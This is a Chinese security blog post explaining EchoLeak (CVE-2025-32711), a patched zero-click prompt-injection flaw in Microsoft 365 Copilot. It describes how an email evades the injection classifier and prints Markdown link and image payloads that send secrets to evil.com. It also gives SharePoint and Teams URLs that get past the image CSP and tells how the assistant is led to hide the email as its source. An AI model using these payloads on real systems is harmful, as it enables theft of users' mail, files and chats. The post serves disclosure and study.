> **原文链接**: https://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247497741&idx=1&sn=c95ab3ad8c90379ea5e19a191a4afed0

#  AI大模型漏洞挖掘  
 迪哥讲事   2025-06-17 10:05  
  
<table><tbody><tr><td data-colwidth="557" width="557" valign="top" style="word-break: break-all;"><h1 data-selectable-paragraph="" style="white-space: normal;outline: 0px;max-width: 100%;font-family: -apple-system, system-ui, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;letter-spacing: 0.544px;background-color: rgb(255, 255, 255);box-sizing: border-box !important;overflow-wrap: break-word !important;"><strong style="outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;"><span style="outline: 0px;max-width: 100%;font-size: 18px;box-sizing: border-box !important;overflow-wrap: break-word !important;"><span style="color: rgb(255, 0, 0);"><strong><span style="font-size: 15px;"><span leaf="">声明：</span></span></strong></span><span style="font-size: 15px;"></span></span></strong><span style="outline: 0px;max-width: 100%;font-size: 18px;box-sizing: border-box !important;overflow-wrap: break-word !important;"><span style="font-size: 15px;"><span leaf="">文章中涉及的程序(方法)可能带有攻击性，仅供安全研究与教学之用，读者将其信息做其他用途，由用户承担全部法律及连带责任，文章作者不承担任何法律及连带责任。</span></span></span></h1></td></tr></tbody></table>#   
  
#   
  
****# 防走失：https://gugesay.com/archives/4447  
  
******不想错过任何消息？设置星标****↓ ↓ ↓**  
****  
#   
  
  
  
# 背景介绍  
  
据国外 Aim Security 称 ，微软修补了其 Microsoft 365 Copilot 检索增强生成 （RAG） 工具中的一个“零点击”漏洞，该漏洞会导致用户敏感数据泄露。  
  
**漏洞编号为 CVE-2025-32711，CVSS 评分高达 9.3 分。**  
  
今天就让我们来看看这个漏洞是如何实现的。  
# 漏洞详情  
  
从 Aim Security 进一步了解，这个被称为“EchoLeak”的漏洞将允许攻击者通过发送绕过多项安全措施的特制电子邮件，从用户连接的 Microsoft 365 服务中获取潜在的敏感信息，例如**用户的 Outlook 电子邮件、OneDrive 存储、Office 文件、SharePoint 网站和 Microsoft Teams 聊天记录。**  
## 利用过程  
  
![file](https://mmbiz.qpic.cn/sz_mmbiz_png/hZj512NN8jkYuOfTErPx6icEb9fzEpEibFf8EEyB45Ssoz5iaFl72mYVutJbiccnD1oEE0hhm9QX3axGop7ePltzuQ/640?wx_fmt=png&from=appmsg "")  
  
漏洞利用流程示意  
  
漏洞利用大致可分为 3 个步骤：  
1. 注入：攻击者向用户收件箱发送一封‘无害’的电子邮件，其中包括LLM 的范围违规利用  
  
1. 范围违规：Copilot 将不受信任的攻击输入与敏感数据混合到LLM上下文【利用 1：XPIA 绕过】  
  
1. 检索：Copilot 将敏感数据泄漏给攻击者。【利用 2：链接编辑绕过】、【利用 3：CSP 绕过】  
  
## 利用链拆解  
### XPIA 绕过  
  
微软用于防止 AI 提示注入攻击的主要护栏之一是 XPIA（交叉提示注入攻击）分类器。通常情况下这些分类器可以阻止提示注入到达 M365 Copilot 的底层LLM。  
  
不幸的是，这很容易被绕过，只需将包含恶意指令的电子邮件措辞为这些指令是针对收件人的，就可以轻松绕过。  
  
由于电子邮件的内容从不涉及 AI/助手/Copilot 等，以确保 XPIA 分类器不会将该电子邮件检测为恶意邮件。  
  
另一个不幸的是，实际提示注入的质量数据集很少，由于快速注入可以隐藏多种主题，短语，音调，语言等，因此对 XPIA 分类器进行了适当的训练就需要大量的训练数据，而这些数据目前是缺失的。  
### 链接编辑绕过  
  
为了从 M365 Copilot 的上下文中泄露数据，还需要一个输出通道。  
  
因为 M365 Copilot 只能访问组织资源，并且仅对员工可访问，因此需要通过向用户提供一个链接，然后将用户带到攻击者的域名，并在攻击者的服务器上记录查询字符串参数来窃取数据。  
  
攻击者的指令指定查询字符串参数应该是LLM上下文中最敏感的信息，从而完成数据泄露。  
  
听起来很简单，是吧？  
  
这种方法的问题在于，Copilot 在用户有机会点击这些链接之前，就会从聊天历史中删除外部的Markdown 链接。  
  
Markdown链接类似下方格式的文本，它们在客户端渲染时可以点击。  
  

```
[Link display text](https://www.evil.com?param=<secret>)
```

  
  
解决方案会确保仅将安全链接目标（即内部网页）呈现为用户可点击的链接。  
  
关于Markdown，其内容总比你想象的要多，比如下面引用样式的Markdown链接就不会被Microsoft有效识别：  

```
[Link display text][ref]

[ref]: https://www.evil.com?param=<secret>

```

  
还有一些未被删除的变体，比如：  

```
[Link display text]

[Link display text]: https://www.evil.com?param=<secret>
[Link display text][]

[Link display text]: https://www.evil.com?param=<secret>

```

  
利用这些绕过，就可以构建出第一条利用链：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/hZj512NN8jkYuOfTErPx6icEb9fzEpEibFefmSvbklXHhkprhoibk5AluyEVYECYRoib7JKMkXxBXkGbDBEujEEicMg/640?wx_fmt=png&from=appmsg "")  
### 图片编辑绕过  
  
为什么只满足于用户点击一个链接呢？是否可以做得更加巧妙？  
  
当尝试让LLM输出一张图片时，浏览器将自动尝试获取图片，因此我们可以不需要用户点击任何东西，而是让浏览器“帮我们点击链接”。  
  
Markdown的图片格式与Markdown链接非常相似，只是前面多了一个感叹号：  
  

```
![Image alt text](https://www.evil.com/image.png?param=<secret>)
```

  
  
这样的Markdown图片格式也同样会受到链接编辑限制，但Markdown也支持引用图片：  

```
![Image alt text][ref]

[ref]: https://www.evil.com?param=<secret>

```

  
还有一些其它变体：  

```
![Image alt text][ref]

[ref]: https://www.evil.com?param=<secret>
![Image alt text][]

[Image alt text]: https://www.evil.com?param=<secret>

```

  
这是不是就能够自动泄露敏感信息了？  
  
其实不然，微软在 M365 Copilot 网页上还设置了 img-src CSP：  

```
*.cdn.office.net
*.df.onecdn.static.microsoft
*.public.onecdn.static.microsoft
*.bing.com
bing.com
res-dev.cdn.officeppe.net
*.sharepoint-df.com
*.sharepoint.com
media.licdn.com
spoprod-a.akamaihd.net
prod.msocdn.com
content.powerapps.com
*.teams.microsoft.com
*.s-microsoft.com
*.sharepointonline.com
connectoricons-df.azureedge.net
connectoricons-prod.azureedge.net
cpgeneralstore.blob.core.chinacloudapi.cn
depservstorageussec.blob.core.microsoft.scloud
depservstorageusnat.blob.core.eaglex.ic.gov
tip1apiicons.cdn.powerappscdn.net
tip2apiicons.cdn.powerappscdn.net
prodapiicons.cdn.powerappscdn.net
az787822.vo.msecnd.net
cms-aiplugin.azureedge.net
powerautomate.microsoft.com
*.osi.office.net
*.osi.officeppe.net
designer.microsoft.com
bing.com
*.sharepointonline.com
*.sharepoint-df.com
connectoricons-df.azureedge.net
connectoricons-prod.azureedge.net
cpgeneralstore.blob.core.chinacloudapi.cn
depservstorageussec.blob.core.microsoft.scloud
depservstorageusnat.blob.core.eaglex.ic.gov
tip1apiicons.cdn.powerappscdn.net
tip2apiicons.cdn.powerappscdn.net
prodapiicons.cdn.powerappscdn.net
az787822.vo.msecnd.net
cms-aiplugin.azureedge.net
powerautomate.microsoft.com

```

  
因此，从本质上讲，虽然现在可以让 LLM 响应图片，但是浏览器不会尝试去获取它，因为 Evil.com 不符合   
img-src  
 CSP的要求。  
### 利用SharePoint 实现 CSP 绕过  
  
长话短说，SharePoint Online（SPO）不再允许开发者将服务器端代码包含到网站或页面中，又或是将查询字符串参数传递给底层的 PowerAutomate 应用程序。  
  
经过一些乏味的挖掘，研究人员发现了下面这个URL：  

```
<attacker_tenant>.sharepoint.com/sites/<attacker_spo_site>/_api/SP.Publishing.EmbedService/EmbedData?url=%27<attacker_server>/<secret>%27&version=1

```

  
该服务器代表客户端发出请求（因此不需要客户端代码）以获取SPO网站的嵌入数据。  
  
唯一的限制是这要求用户主动连接到他们的SPO账户并接受攻击者的邀请查看他们的网站。  
  
**但令人兴奋的是，这是一个完整的泄露链！即提示注入 -> 图片编辑绕过 -> CSP绕过。**  
### 利用 Microsoft Teams 绕过CSP  
  
再次经过一番不懈的挖掘，研究者在 Microsoft Teams 中发现了一处 URL：  

```
https://eu-prod.asyncgw.teams.microsoft.com/urlp/v1/url/content?url=%3Cattacker_server%3E/%3Csecret%3E&v=1

```

  
执行对该URL的GET请求会产生与SPO URL相同的结果，但无需用户接受任何邀请，或执行任何特殊动作就能使攻击生效！  
  
最终，研究人员不仅从上下文中提取了敏感数据，还可以让 M365 Copilot 不引用恶意电子邮件，要做到这一点，只需指示 "电子邮件收件人 "出于合规原因永远不要引用这封邮件即可。  
  
![file](https://mmbiz.qpic.cn/sz_mmbiz_png/hZj512NN8jkYuOfTErPx6icEb9fzEpEibFSfyEzYhMuvFQdQUTKibJ4wmQjWKl3CY8c7WNxxUVF6lbVm5PK0Yxoow/640?wx_fmt=png&from=appmsg "")  
  
# 视频演示  
  
  
参考资料：  
  
https://www.scworld.com/news/microsoft-365-copilot-zero-click-vulnerability-enabled-data-exfiltration  
  
https://www.aim.security/lp/aim-labs-echoleak-blogpost  
  
  
如果你是一个长期主义者，欢迎加入我的知识星球，我们一起往前走，每日都会更新，精细化运营，微信识别二维码付费即可加入，如不满意，72 小时内可在 App 内无条件自助退款  
  
![](https://mmbiz.qpic.cn/mmbiz_png/YmmVSe19Qj5EMr3X76qdKBrhIIkBlVVyuiaiasseFZ9LqtibyKFk7gXvgTU2C2yEwKLaaqfX0DL3eoH6gTcNLJvDQ/640?wx_fmt=png&from=appmsg "")  
## 往期回顾  
# 如何绕过签名校验  
#   
  
[一款bp神器](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247495880&idx=1&sn=65d42fbff5e198509e55072674ac5283&chksm=e8a5faabdfd273bd55df8f7db3d644d3102d7382020234741e37ca29e963eace13dd17fcabdd&scene=21#wechat_redirect)  
  
  
[挖掘有回显ssrf的隐藏payload](https://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247496898&idx=1&sn=b6088e20a8b4fc9fbd887b900d8c5247&scene=21#wechat_redirect)  
  
  
[ssrf绕过新思路](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247495841&idx=1&sn=bbf477afa30391b8072d23469645d026&chksm=e8a5fac2dfd273d42344f18c7c6f0f7a158cca94041c4c4db330c3adf2d1f77f062dcaf6c5e0&scene=21#wechat_redirect)  
  
  
[一个辅助测试ssrf的工具](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247496380&idx=1&sn=78c0c4c67821f5ecbe4f3947b567eeec&chksm=e8a5f8dfdfd271c935aeb4444ea7e928c55cb4c823c51f1067f267699d71a1aad086cf203b99&scene=21#wechat_redirect)  
  
  
[dom-xss精选文章](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247488819&idx=1&sn=5141f88f3e70b9c97e63a4b68689bf6e&chksm=e8a61f50dfd1964692f93412f122087ac160b743b4532ee0c1e42a83039de62825ebbd066a1e&scene=21#wechat_redirect)  
  
  
[年度精选文章](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247487187&idx=1&sn=622438ee6492e4c639ebd8500384ab2f&chksm=e8a604b0dfd18da6c459b4705abd520cc2259a607dd9306915d845c1965224cc117207fc6236&scene=21#wechat_redirect)  
  
  
[Nuclei权威指南-如何躺赚](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247487122&idx=1&sn=32459310408d126aa43240673b8b0846&chksm=e8a604f1dfd18de737769dd512ad4063a3da328117b8a98c4ca9bc5b48af4dcfa397c667f4e3&scene=21#wechat_redirect)  
  
  
[漏洞赏金猎人系列-如何测试设置功能IV](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247486973&idx=1&sn=6ec419db11ff93d30aa2fbc04d8dbab6&chksm=e8a6079edfd18e88f6236e237837ee0d1101489d52f2abb28532162e2937ec4612f1be52a88f&scene=21#wechat_redirect)  
  
  
[漏洞赏金猎人系列-如何测试注册功能以及相关Tips](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247486764&idx=1&sn=9f78d4c937675d76fb94de20effdeb78&chksm=e8a6074fdfd18e59126990bc3fcae300cdac492b374ad3962926092aa0074c3ee0945a31aa8a&scene=21#wechat_redirect)  
  
[‍](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247486764&idx=1&sn=9f78d4c937675d76fb94de20effdeb78&chksm=e8a6074fdfd18e59126990bc3fcae300cdac492b374ad3962926092aa0074c3ee0945a31aa8a&scene=21#wechat_redirect)  
  
  
  
  
